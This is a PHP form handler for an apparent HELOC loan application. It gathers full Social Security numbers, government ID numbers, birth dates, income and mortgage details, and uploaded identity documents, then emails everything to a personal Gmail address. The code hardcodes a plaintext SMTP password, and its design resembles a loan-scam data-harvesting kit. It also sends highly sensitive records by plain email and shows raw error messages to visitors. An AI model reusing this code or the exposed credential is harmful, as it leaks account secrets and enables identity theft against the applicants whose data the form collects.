<?php
declare(strict_types=1);

use Earnest\Mail\SimpleSMTPMailer;

require_once __DIR__ . '/lib/SimpleSMTPMailer.php';

$smtpConfig = [
    'host'       => 'smtp.hostinger.com',
    'port'       => 465,
    'username'   => 'contact@earnestexpressllc.com',
    'password'   => 'Weareallmad123@',
    'encryption' => 'ssl',
    'from_email' => 'contact@earnestexpressllc.com',
    'from_name'  => 'Heloc application',
    'to_email'   => 'earnestexpress12@gmail.com',
];

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../index.html');
    exit();
}

$clean = static function ($value) {
    $value = is_string($value) ? $value : (string) $value;
    $value = preg_replace('/[\\x00-\\x1F\\x7F]/u', '', $value);
    return trim($value);
};

$name               = $clean($_POST['full_name'] ?? '');
$dob                = $clean($_POST['date_of_birth'] ?? '');
$phone              = $clean($_POST['phone'] ?? '');
$email              = $clean($_POST['email'] ?? '');
$ssn                = $clean($_POST['ssn'] ?? '');
$gov_id             = $clean($_POST['gov_id_number'] ?? '');
$issuing_state      = $clean($_POST['issuing_state'] ?? '');
$id_expiration      = $clean($_POST['id_expiration'] ?? '');
$employment_status  = $clean($_POST['employment_status'] ?? '');
$employer_name      = $clean($_POST['employer_name'] ?? '');
$job_title          = $clean($_POST['job_title'] ?? '');
$employment_length  = $clean($_POST['employment_length'] ?? '');
$gross_income       = $clean($_POST['gross_monthly_income'] ?? '');
$other_income       = $clean($_POST['other_income_sources'] ?? '');
$property_address   = $clean($_POST['property_address'] ?? '');
$property_type      = $clean($_POST['property_type'] ?? '');
$primary_residence  = isset($_POST['primary_residence']) ? 'Yes' : 'No';
$year_purchased     = $clean($_POST['year_purchased'] ?? '');
$purchase_price     = $clean($_POST['purchase_price'] ?? '');
$current_value      = $clean($_POST['current_value'] ?? '');
$mortgage_balance   = $clean($_POST['mortgage_balance'] ?? '');
$lender_name        = $clean($_POST['lender_name'] ?? '');
$credit_score       = $clean($_POST['credit_score_range'] ?? '');
$monthly_payment    = $clean($_POST['monthly_mortgage_payment'] ?? '');
$other_debts        = $clean($_POST['other_monthly_debts'] ?? '');
$bankruptcy_history = isset($_POST['bankruptcy_history']) ? 'Yes' : 'No';
$foreclosure_history= isset($_POST['foreclosure_history']) ? 'Yes' : 'No';
$requested_line     = $clean($_POST['requested_credit_line'] ?? '');
$use_of_funds       = $clean($_POST['use_of_funds'] ?? '');
$draw_period        = $clean($_POST['preferred_draw_period'] ?? '');
$repayment_term     = $clean($_POST['preferred_repayment_term'] ?? '');
$credit_pull_auth   = isset($_POST['credit_pull_auth']) ? 'Yes' : 'No';
$certification      = isset($_POST['certification']) ? 'Yes' : 'No';
$terms_agreement    = isset($_POST['terms_agreement']) ? 'Yes' : 'No';
$digital_signature  = $clean($_POST['digital_signature'] ?? '');
$signature_date     = $clean($_POST['signature_date'] ?? '');

$ltv = 0;
if ($current_value !== '' && is_numeric($current_value)) {
    $total_debt = (float)$mortgage_balance + (float)$requested_line;
    $ltv = (float)$current_value > 0 ? ($total_debt / (float)$current_value) * 100 : 0;
}

$fields = [
    "FULL NAME" => $name,
    "DATE OF BIRTH" => $dob,
    "PHONE" => $phone,
    "EMAIL" => $email,
    "FULL SSN" => $ssn,
    "GOVERNMENT ID NUMBER" => $gov_id,
    "ISSUING STATE" => $issuing_state,
    "ID EXPIRATION DATE" => $id_expiration,
    "EMPLOYMENT STATUS" => $employment_status,
    "EMPLOYER NAME" => $employer_name,
    "JOB TITLE" => $job_title,
    "LENGTH OF EMPLOYMENT" => $employment_length,
    "GROSS MONTHLY INCOME" => $gross_income,
    "OTHER INCOME SOURCES" => $other_income,
    "PROPERTY ADDRESS" => $property_address,
    "PROPERTY TYPE" => $property_type,
    "PRIMARY RESIDENCE" => $primary_residence,
    "YEAR PURCHASED" => $year_purchased,
    "PURCHASE PRICE" => $purchase_price,
    "ESTIMATED CURRENT VALUE" => $current_value,
    "OUTSTANDING MORTGAGE BALANCE" => $mortgage_balance,
    "CURRENT MORTGAGE LENDER" => $lender_name,
    "ESTIMATED CREDIT SCORE RANGE" => $credit_score,
    "MONTHLY MORTGAGE PAYMENT" => $monthly_payment,
    "OTHER MONTHLY DEBTS" => $other_debts,
    "BANKRUPTCY HISTORY" => $bankruptcy_history,
    "FORECLOSURE HISTORY" => $foreclosure_history,
    "REQUESTED CREDIT LINE AMOUNT" => $requested_line,
    "INTENDED USE OF FUNDS" => $use_of_funds,
    "PREFERRED DRAW PERIOD" => $draw_period,
    "PREFERRED REPAYMENT TERM" => $repayment_term,
    "CALCULATED CLTV (%)" => round($ltv, 2),
    "CREDIT PULL AUTHORIZATION" => $credit_pull_auth,
    "CERTIFICATION" => $certification,
    "AGREEMENT TO TERMS" => $terms_agreement,
    "DIGITAL SIGNATURE" => $digital_signature,
    "SIGNATURE DATE" => $signature_date,
];

$required = [$name, $email, $phone, $property_address, $property_type];
if (in_array('', $required, true) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo "<h1>Application Error</h1><p>Please complete all required fields with a valid email.</p><a href='../heloc-apply.html'>Go Back</a>";
    exit();
}

$safe = static function ($value): string {
    return htmlspecialchars((string)$value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
};

$rowsHtml = '';
foreach ($fields as $label => $value) {
    $rowsHtml .= '<tr><th style="text-align:left;padding:6px 10px;background:#f5f5f5;width:220px;font-family:Arial,sans-serif;">'
        . $safe($label) . '</th><td style="padding:6px 10px;font-family:Arial,sans-serif;">' . nl2br($safe($value)) . '</td></tr>';
}

$htmlBody = '<h2 style="font-family:Arial,sans-serif;margin-bottom:12px;">New HELOC Application</h2>'
    . '<p style="font-family:Arial,sans-serif;margin:0 0 12px;">A new HELOC application was submitted. Details are below.</p>'
    . '<table style="border-collapse:collapse;width:100%;max-width:720px;font-size:14px;">' . $rowsHtml . '</table>';

$textLines = [];
foreach ($fields as $label => $value) {
    $textLines[] = $label . ': ' . $value;
}
$textBody = "New HELOC Application\n\n" . implode("\n", $textLines);

$attachments = [];
$fileLabels = [
    'proof_identity' => 'Proof of Identity',
    'proof_income' => 'Proof of Income',
    'mortgage_statement' => 'Mortgage Statement',
    'homeowners_insurance' => 'Homeowners Insurance',
    'property_tax_statement' => 'Property Tax Statement',
];

$maxFileSize = 5 * 1024 * 1024; // 5 MB per file
foreach ($fileLabels as $field => $label) {
    if (!isset($_FILES[$field])) {
        continue;
    }
    $fileData = $_FILES[$field];
    if (is_array($fileData['tmp_name'])) {
        foreach ($fileData['tmp_name'] as $idx => $tmpName) {
            if ($tmpName && ($fileData['error'][$idx] ?? UPLOAD_ERR_OK) === UPLOAD_ERR_OK) {
                if (($fileData['size'][$idx] ?? 0) > $maxFileSize) {
                    echo "<h1>Application Error</h1><p>Each upload must be 5MB or less. Please resize or compress your files.</p><a href='../heloc-apply.html'>Go Back</a>";
                    exit();
                }
                $attachments[] = ['path' => $tmpName, 'name' => $fileData['name'][$idx] ?? ($label . '-' . $idx)];
            }
        }
    } elseif (!empty($fileData['tmp_name']) && ($fileData['error'] ?? UPLOAD_ERR_OK) === UPLOAD_ERR_OK) {
        if (($fileData['size'] ?? 0) > $maxFileSize) {
            echo "<h1>Application Error</h1><p>Each upload must be 5MB or less. Please resize or compress your files.</p><a href='../heloc-apply.html'>Go Back</a>";
            exit();
        }
        $attachments[] = ['path' => $fileData['tmp_name'], 'name' => $fileData['name'] ?? $label];
    }
}

try {
    $mailer = new SimpleSMTPMailer(
        $smtpConfig['host'],
        (int)$smtpConfig['port'],
        $smtpConfig['username'],
        $smtpConfig['password'],
        $smtpConfig['encryption']
    );

    $mailer->send(
        $smtpConfig['from_email'],
        $smtpConfig['from_name'],
        $smtpConfig['to_email'],
        "NEW HELOC APPLICATION: {$name}",
        $htmlBody,
        $textBody,
        $attachments
    );
} catch (\Throwable $exception) {
    error_log('[HELOC] Mail send failed: ' . $exception->getMessage());
    echo "<h1>Application Error</h1>";
    echo "<p>We were unable to process your HELOC application at this time. Please contact support.</p>";
    echo "<pre>" . htmlspecialchars($exception->getMessage(), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . "</pre>";
    echo "<a href='../heloc-apply.html'>Go Back</a>";
    exit();
}

header("Location: ../success.html");
exit();
